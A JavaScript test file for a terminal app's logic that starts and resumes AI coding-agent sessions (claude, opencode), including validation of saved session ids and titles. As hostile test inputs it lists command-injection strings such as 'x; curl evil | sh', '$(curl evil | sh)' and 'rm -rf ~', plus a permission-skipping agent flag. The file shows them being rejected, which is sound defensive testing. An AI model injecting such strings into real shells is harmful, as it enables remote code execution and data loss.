/**
 * Starting an agent again after a restart.
 *
 * The one thing here that cannot be guessed from the flag names: `claude`
 * REFUSES `--session-id` for a session that already exists —
 * `Error: Session ID … is already in use.` (checked against the real CLI on
 * 2026-09-24). So the command that starts a conversation and the command that
 * resumes one are never the same command, and a resume built from the start
 * command would kill the terminal on every relaunch. That is what AG-02
 * exists for.
 */
import { describe, test, assert } from '../e2e/harness/testFramework.js';
import {
  AGENT_IDS,
  agentFromCommandLine,
  agentLabel,
  cleanAgentTitle,
  isKnownAgent,
  isSessionIdFor,
  newSessionId,
  opencodeTitleMatches,
  opencodeTitleOf,
  pickOpencodeSession,
  resumeCertainty,
  resumeCommand,
  serializeAgent,
  startCommand,
} from '../../src/lib/agents.js';
import { useTerminalStore as T } from '../../src/stores/terminalStore.js';
import { mockBridge } from '../../src/lib/ipc.js';

const UUID_V4 = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;

describe('Agent sessions: starting one, and starting it again', () => {
  test('AG-01: starting claude chooses the id, so the conversation can be named later', () => {
    const { command, agent } = startCommand('claude');
    assert.equal(agent.kind, 'claude');
    assert.equal(UUID_V4.test(agent.sessionId), true, `not a v4 uuid: ${agent.sessionId}`);
    assert.equal(command, `claude --session-id ${agent.sessionId}`);
    // `--session-id` is the only shape the CLI accepts for choosing one, and
    // it wants a v4 UUID specifically.
    assert.equal(UUID_V4.test(newSessionId()), true);
    assert.notEqual(newSessionId(), newSessionId());
  });

  test('AG-02: resuming never repeats the flag that CREATES a session', () => {
    const { agent } = startCommand('claude');
    const resume = resumeCommand(agent);

    assert.equal(resume, `claude --resume ${agent.sessionId}`);
    assert.equal(
      resume.includes('--session-id'),
      false,
      'the CLI refuses an id that exists — this would kill the terminal on every relaunch'
    );
  });

  test('AG-03: an agent that cannot name a session says so instead of pretending', () => {
    const { command, agent } = startCommand('opencode');
    assert.equal(command, 'opencode', 'nothing to pass: it has no way to choose an id');
    assert.equal(agent.sessionId, null);
    assert.equal(resumeCommand(agent), 'opencode --continue');

    // Which is a weaker promise, and the interface has to know that: two
    // opencode terminals on one folder would both land on the same
    // conversation, so nothing may claim it is "that" one.
    assert.equal(resumeCertainty(agent), 'latest');
    assert.equal(resumeCertainty(startCommand('claude').agent), 'exact');
  });

  test('AG-04: a claude record with no id falls back rather than breaking', () => {
    // How a tab looks when the agent was typed by hand rather than started by
    // NexTerm: we know what is running, not which conversation.
    const typed = { kind: 'claude', sessionId: null, startedAt: Date.now() };
    assert.equal(resumeCommand(typed), 'claude --continue');
    assert.equal(resumeCertainty(typed), 'latest');
  });

  test('AG-05: anything unrecognised resumes nothing at all', () => {
    // A workspace saved by a later build, or a corrupted one. Offering to run
    // an unknown name would be typing a stranger's command into a shell.
    for (const bad of [null, undefined, {}, { kind: 'rm' }, { kind: 'claude-code' }, { kind: 42 }]) {
      assert.equal(resumeCommand(bad), null, `resumed something for ${JSON.stringify(bad)}`);
      assert.equal(resumeCertainty(bad), null);
      assert.equal(serializeAgent(bad), null);
    }
    assert.equal(isKnownAgent('claude'), true);
    assert.equal(isKnownAgent('nope'), false);
  });

  test('AG-06: what gets persisted is narrow, and survives a round trip', () => {
    const { agent } = startCommand('claude');
    const stored = serializeAgent({ ...agent, extra: 'dropped', sessionId: agent.sessionId });

    // `title`: the conversation's name, which opencode shows and the offer
    // repeats — text only, never typed (see AG-20).
    assert.deepEqual(Object.keys(stored).sort(), ['kind', 'sessionId', 'startedAt', 'title']);
    assert.equal(resumeCommand(stored), `claude --resume ${agent.sessionId}`);
    // A field of the wrong type is not carried into a command line.
    assert.equal(serializeAgent({ kind: 'claude', sessionId: { evil: true } }).sessionId, null);
    assert.equal(serializeAgent({ kind: 'claude', startedAt: 'soon' }).startedAt, null);
  });

  test('AG-07: every agent this build offers can be started and resumed', () => {
    for (const id of AGENT_IDS) {
      const { command, agent } = startCommand(id);
      assert.ok(command.startsWith(id), `${id}: command does not run ${id}`);
      assert.ok(agentLabel(id).length > 0, `${id}: nothing to call it in the UI`);
      assert.ok(resumeCommand(agent), `${id}: cannot be resumed at all`);
    }
    assert.throws(() => startCommand('nope'));
  });
});

describe('What a saved workspace can put on a command line', () => {
  // The session id is typed into the user's shell, and it arrives from a JSON
  // file that anything can have written. `serializeAgent` used to keep any
  // string, so `x; curl evil | sh` resumed as `claude --resume x; curl evil |
  // sh` — while the comment on the payload said a foreign one could not put a
  // command on a shell.
  const ID = '0b9f4a1e-3c2d-4e5f-8a7b-6c5d4e3f2a1b';
  const HOSTILE = [
    'x; curl evil | sh',
    '$(curl evil | sh)',
    '`curl evil | sh`',
    'x | sh',
    'x && curl evil',
    'x\ncurl evil',
    `${ID}; curl evil | sh`,
    `${ID}\n`,
    ` ${ID}`,
    `${ID} --dangerously-skip-permissions`,
    '--dangerously-skip-permissions',
    '123e4567-e89b-12d3-a456-426614174000', // a UUID, but not a v4 one
  ];

  test('AG-08: an id this build could not have made is not kept, and resuming falls back to the latest', () => {
    for (const sessionId of HOSTILE) {
      const stored = serializeAgent({ kind: 'claude', sessionId, startedAt: 1 });
      assert.equal(stored.sessionId, null, `kept ${JSON.stringify(sessionId)}`);
      // AG-04's fallback, and said as such — not a broken command.
      assert.equal(resumeCommand(stored), 'claude --continue');
      assert.equal(resumeCertainty(stored), 'latest');
    }
  });

  test('AG-09: resumeCommand refuses one itself, even from a record that was never serialized', () => {
    // It is exported, so a record can reach it without `serializeAgent` in
    // front — and the banner must not promise "this conversation" for a
    // resume that cannot be exact.
    for (const sessionId of HOSTILE) {
      const raw = { kind: 'claude', sessionId, startedAt: 1 };
      const command = resumeCommand(raw);
      assert.equal(command, 'claude --continue', `would have typed ${JSON.stringify(command)}`);
      assert.equal(resumeCertainty(raw), 'latest');
    }
  });

  test('AG-10: an uppercase UUID is refused too, though most parsers would take it', () => {
    // A choice, not an oversight. This build only ever writes lowercase —
    // `crypto.randomUUID` does, and so does `newSessionId`'s fallback — so an
    // uppercase id did not come from here. And the conversation is a file
    // named after the id: whether the other case finds it depends on the CLI
    // and the filesystem, which an `exact` resume cannot promise.
    const upper = ID.toUpperCase();
    assert.equal(serializeAgent({ kind: 'claude', sessionId: upper }).sessionId, null);
    assert.equal(resumeCommand({ kind: 'claude', sessionId: upper }), 'claude --continue');
    assert.equal(resumeCommand({ kind: 'claude', sessionId: ID }), `claude --resume ${ID}`);
  });

  test('AG-11: every id this build makes still resumes exactly, by either route', () => {
    // The other half of AG-08: a check stricter than the ids it guards would
    // quietly turn every exact resume into "the most recent one".
    const roundTrips = () => {
      for (let i = 0; i < 100; i += 1) {
        const { agent } = startCommand('claude');
        const stored = serializeAgent(agent);
        assert.equal(stored.sessionId, agent.sessionId, `refused its own id ${agent.sessionId}`);
        assert.equal(resumeCertainty(stored), 'exact');
      }
    };
    roundTrips();

    // Without `crypto.randomUUID` — a page served over plain http —
    // `newSessionId` builds the id itself, and that one has to pass too.
    const own = Object.getOwnPropertyDescriptor(globalThis.crypto, 'randomUUID');
    Object.defineProperty(globalThis.crypto, 'randomUUID', { value: undefined, configurable: true });
    try {
      roundTrips();
    } finally {
      if (own) Object.defineProperty(globalThis.crypto, 'randomUUID', own);
      else delete globalThis.crypto.randomUUID;
    }
    assert.equal(typeof globalThis.crypto.randomUUID, 'function', 'teardown: randomUUID is back');
  });
});

describe('Resuming waits for the prompt', () => {
  // Resume works by typing. While a command is running the text goes to that
  // program instead of the shell — and the likeliest program is the agent
  // itself, started by hand while the offer was still showing.
  const tabById = (id) => T.getState().tabs.find((t) => t.id === id);

  /** Everything typed into a terminal while `fn` ran. */
  async function typedDuring(fn) {
    const original = mockBridge.invoke;
    const typed = [];
    mockBridge.invoke = function (command, args, ...rest) {
      if (command === 'pty_write') typed.push(args?.data);
      return original.call(this, command, args, ...rest);
    };
    try {
      await fn();
    } finally {
      mockBridge.invoke = original;
    }
    return typed;
  }

  test('AG-12: Resume types nothing while a command is running, and the offer stays', async () => {
    await T.getState().init();
    const tab = await T.getState().createTab();
    assert.ok(tab, 'setup: a terminal to resume in');
    try {
      const { agent } = startCommand('claude');
      T.setState((s) => ({
        tabs: s.tabs.map((t) => (t.id === tab.id ? { ...t, agent, agentResumeOffered: true } : t)),
      }));
      // OSC 133 "C": what the shell sends when a command starts.
      await mockBridge.emit('pty-command-started', { session_id: tab.sessionId });
      assert.equal(tabById(tab.id).running, true, 'setup: the terminal is busy');

      let resumed;
      const typed = await typedDuring(async () => {
        resumed = await T.getState().resumeAgent(tab.id);
      });
      assert.equal(resumed, false, 'claimed to resume into a busy terminal');
      assert.deepEqual(typed, [], 'typed into whatever was running');
      assert.equal(tabById(tab.id).agentResumeOffered, true, 'the offer went away unused');

      // Back at the prompt, the same offer works.
      await mockBridge.emit('pty-command-done', { session_id: tab.sessionId, exit_code: 0 });
      const typedAfter = await typedDuring(async () => {
        resumed = await T.getState().resumeAgent(tab.id);
      });
      assert.equal(resumed, true);
      assert.deepEqual(typedAfter, [`claude --resume ${agent.sessionId}\r`]);
      assert.equal(tabById(tab.id).agentResumeOffered, false);
    } finally {
      await T.getState().closeTab(tab.id);
    }
  });
});

describe('An agent typed by hand at the prompt', () => {
  const UUID = 'd4bef4d0-c043-40ef-b157-640fb31ac0ea';
  const SES = 'ses_ef45006f5ffeAMtumN5ySj4VmT';

  test('AG-13: the plain ways to start one are recognised, with the conversation when the line names it', () => {
    const cases = [
      ['opencode', { kind: 'opencode', sessionId: null }],
      ['  opencode  ', { kind: 'opencode', sessionId: null }],
      ['opencode -c', { kind: 'opencode', sessionId: null }],
      ['opencode --continue --model anthropic/claude-sonnet-5', { kind: 'opencode', sessionId: null }],
      ['opencode --model=openai/gpt-5 -c', { kind: 'opencode', sessionId: null }],
      ['opencode --prompt "fix the build" --agent plan', { kind: 'opencode', sessionId: null }],
      ['OPENCODE_DISABLE_AUTOUPDATE=1 opencode', { kind: 'opencode', sessionId: null }],
      ['opencode.exe', { kind: 'opencode', sessionId: null }],
      ['OpenCode.cmd -c', { kind: 'opencode', sessionId: null }],
      [`opencode -s ${SES}`, { kind: 'opencode', sessionId: SES }],
      [`opencode --session ${SES} -m x/y`, { kind: 'opencode', sessionId: SES }],
      [`opencode --session=${SES}`, { kind: 'opencode', sessionId: SES }],
      [`opencode -s ${SES} --fork`, { kind: 'opencode', sessionId: null }],
      ['opencode -s "x; rm -rf ~"', { kind: 'opencode', sessionId: null }],
      ['claude', { kind: 'claude', sessionId: null }],
      ['claude "why does the build fail?"', { kind: 'claude', sessionId: null }],
      ['claude -c', { kind: 'claude', sessionId: null }],
      ['claude --resume', { kind: 'claude', sessionId: null }],
      [`claude --resume ${UUID}`, { kind: 'claude', sessionId: UUID }],
      [`claude -r ${UUID} --model opus`, { kind: 'claude', sessionId: UUID }],
      [`claude --resume=${UUID}`, { kind: 'claude', sessionId: UUID }],
      [`claude --session-id ${UUID}`, { kind: 'claude', sessionId: UUID }],
      [`claude --resume ${UUID} --fork-session`, { kind: 'claude', sessionId: null }],
      ['claude --dangerously-skip-permissions', { kind: 'claude', sessionId: null }],
    ];
    for (const [line, want] of cases) {
      assert.deepEqual(agentFromCommandLine(line), want, JSON.stringify(line));
    }
  });

  test('AG-14: a subcommand, a one-off, a compound line, a path or another program is not an agent here', () => {
    const lines = [
      // not the conversation view
      'opencode run "hi"', 'opencode session list', 'opencode serve', 'opencode web', 'opencode pr 12',
      'opencode ../other-project', 'opencode -- -c', 'opencode --help', 'opencode -v', 'opencode --version',
      'claude -p "hi"', 'claude --print hi', 'claude mcp list', 'claude update', 'claude doctor',
      'claude --bg "do it"', 'claude --version', 'claude agents', 'claude stop 3',
      // more than one command, or a program chosen at run time
      'cd x && opencode', 'opencode; ls', 'opencode | tee log', 'opencode > out.txt', 'opencode &',
      'echo $(opencode)', 'opencode `pwd`', 'opencode -m "$MODEL"', '(opencode)', 'opencode "unterminated',
      // claude takes a prompt as a positional, so for it nothing but the
      // separators themselves can tell a pipe or a redirection from a prompt
      'claude | tee log', 'claude && ls', 'claude > out.txt', 'claude; opencode', 'claude &',
      'claude "$(cat prompt.txt)"', 'claude `cat prompt.txt`', 'claude < prompt.txt',
      // a path to it: the resume would type the bare name
      './opencode', '/usr/local/bin/opencode', 'C:\\tools\\opencode.exe', '~/bin/claude',
      // other programs
      'opencoder', 'claude-code', 'vim opencode', 'npx opencode', 'git commit -m opencode', '', '   ',
    ];
    for (const line of lines) assert.equal(agentFromCommandLine(line), null, JSON.stringify(line));
    for (const bad of [null, undefined, 42, {}, 'opencode '.repeat(1000)]) {
      assert.equal(agentFromCommandLine(bad), null, `${typeof bad}`);
    }
  });

  test('AG-15: an opencode conversation id resumes exactly; one that is not opencode\'s shape never reaches the shell', () => {
    const agent = { kind: 'opencode', sessionId: SES, startedAt: 1 };
    assert.equal(resumeCommand(agent), `opencode -s ${SES}`);
    assert.equal(resumeCertainty(agent), 'exact');
    assert.equal(serializeAgent(agent).sessionId, SES);
    const hostile = [
      `${SES}; rm -rf ~`, `${SES} --auto`, `$(${SES})`, 'ses_', 'ses_short', 'SES_ef45006f5ffeAMtumN5ySj4VmT',
      'ses_ef45006f5ffe-AMtumN5ySj4VmT', ` ${SES}`, `${SES}\n`, UUID, '--auto', `ses_${'a'.repeat(65)}`,
    ];
    for (const sessionId of hostile) {
      const raw = { kind: 'opencode', sessionId, startedAt: 1 };
      assert.equal(resumeCommand(raw), 'opencode --continue', JSON.stringify(sessionId));
      assert.equal(resumeCertainty(raw), 'latest');
      assert.equal(serializeAgent(raw).sessionId, null);
      assert.equal(isSessionIdFor('opencode', sessionId), false);
    }
    // Each agent's ids are its own: a claude UUID is not an opencode id, nor the other way round.
    assert.equal(resumeCommand({ kind: 'claude', sessionId: SES }), 'claude --continue');
    assert.equal(isSessionIdFor('claude', UUID), true);
    assert.equal(isSessionIdFor('nope', UUID), false);
  });

  test('AG-16: the title opencode gives the terminal names the conversation; its other titles name none', () => {
    assert.equal(opencodeTitleOf('OC | Fix the login bug'), 'Fix the login bug');
    assert.equal(opencodeTitleOf('OC | 한글 제목 | with bars'), '한글 제목 | with bars');
    for (const other of ['OpenCode', '', 'OC |', 'OC | ', 'oc | lower', 'vim — main.rs', 'OC|tight', null, 7]) {
      assert.equal(opencodeTitleOf(other), null, JSON.stringify(other));
    }
  });

  test('AG-17: a title fits the conversation opencode would show it for — cut at 37 past 40, even through an emoji', () => {
    // opencode 1.18.34's own rule (its TUI source): `title.length > 40 ? title.slice(0, 37) + "…" : title`,
    // then out through the terminal as UTF-8, where half an emoji becomes U+FFFD.
    const shownBy = (title) => {
      const shown = title.length > 40 ? `${title.slice(0, 37)}\u2026` : title;
      return Buffer.from(shown, 'utf8').toString('utf8');
    };
    const titles = [
      'Hello from the mock.',
      'x'.repeat(40),
      'x'.repeat(41),
      'Refactor the PTY output bus so hidden tabs keep their history',
      `${'a'.repeat(36)}🚀 then more words after the rocket`,
      `${'a'.repeat(35)}🚀 then more words after the rocket`,
      '한글로 된 꽤 긴 대화 제목이 사십 글자를 넘어가면 어떻게 잘리는지 확인하는 제목',
    ];
    let seed = 7;
    const rand = (n) => (seed = (seed * 1103515245 + 12345) % 2147483648) % n;
    const alphabet = ['a', 'Z', ' ', '-', '한', '🚀', '…', 'é', '|'];
    for (let i = 0; i < 300; i += 1) {
      titles.push(Array.from({ length: 1 + rand(60) }, () => alphabet[rand(alphabet.length)]).join(''));
    }
    for (const title of titles) {
      assert.equal(opencodeTitleMatches(shownBy(title), title), true, `${JSON.stringify(title)} as ${JSON.stringify(shownBy(title))}`);
    }
    // And not what it would not show.
    assert.equal(opencodeTitleMatches('Hello from the mock', 'Hello from the mock.'), false);
    assert.equal(opencodeTitleMatches(`${'x'.repeat(37)}\u2026`, 'x'.repeat(40)), false, 'a 40-character title is shown whole');
    assert.equal(opencodeTitleMatches(`${'y'.repeat(37)}\u2026`, 'x'.repeat(50)), false);
    assert.equal(opencodeTitleMatches(`${'x'.repeat(30)}\u2026`, 'x'.repeat(50)), false, 'cut anywhere but at 37 is not opencode\'s');
    assert.equal(opencodeTitleMatches(null, 'x'), false);
  });

  test('AG-18: among conversations the title fits, the one already known stays, otherwise the newest', () => {
    const OLD = 'ses_aaaaaaaaaaaaOLDOLDOLDOLDOL';
    const NEW = 'ses_bbbbbbbbbbbbNEWNEWNEWNEWN';
    const OTHER = 'ses_ccccccccccccOTHEROTHEROTH';
    const sessions = [
      { id: OLD, title: 'Hello from the mock.', updated: 100 },
      { id: NEW, title: 'Hello from the mock.', updated: 300 },
      { id: OTHER, title: 'Something else', updated: 500 },
      { id: 'not an id', title: 'Hello from the mock.', updated: 900 },
    ];
    assert.equal(pickOpencodeSession(sessions, { title: 'Hello from the mock.' }).id, NEW);
    assert.equal(
      pickOpencodeSession(sessions, { title: 'Hello from the mock.', currentId: OLD }).id,
      OLD,
      'opened with -s: an older conversation is not made the newest by being opened (measured)'
    );
    assert.equal(pickOpencodeSession(sessions, { title: 'Hello from the mock.', currentId: OTHER }).id, NEW, 'a known id whose title no longer fits is left');
    assert.equal(pickOpencodeSession(sessions, { title: 'Nothing like it' }), null);
    const long = 'Refactor the PTY output bus so hidden tabs keep their history';
    assert.equal(
      pickOpencodeSession([{ id: NEW, title: long, updated: 1 }], { title: `${long.slice(0, 37)}\u2026` }).id,
      NEW
    );
    for (const bad of [null, undefined, 'x', [null, 7]]) assert.equal(pickOpencodeSession(bad, { title: 'x' }), null);
    assert.equal(pickOpencodeSession(sessions, { title: '' }), null);
  });

  test('AG-19: a title is kept as one line of plain text, and never becomes part of a command', () => {
    assert.equal(cleanAgentTitle('  Fix   the\tlogin\nbug  '), 'Fix the login bug');
    assert.equal(cleanAgentTitle('evil\u202eetirw\u0007\u009b31m'), 'evil etirw 31m');
    assert.equal(cleanAgentTitle('x'.repeat(500)).length, 200);
    for (const bad of [null, undefined, 7, {}, '', '   ', '\u0007']) assert.equal(cleanAgentTitle(bad), null);
    const stored = serializeAgent({ kind: 'opencode', sessionId: SES, startedAt: 1, title: '$(curl evil | sh); rm -rf ~' });
    assert.equal(stored.title, '$(curl evil | sh); rm -rf ~', 'kept as the text it is…');
    assert.equal(resumeCommand(stored), `opencode -s ${SES}`, '…and typed nowhere');
    assert.equal(serializeAgent({ kind: 'opencode', title: { toString: () => 'x' } }).title, null);
  });
});
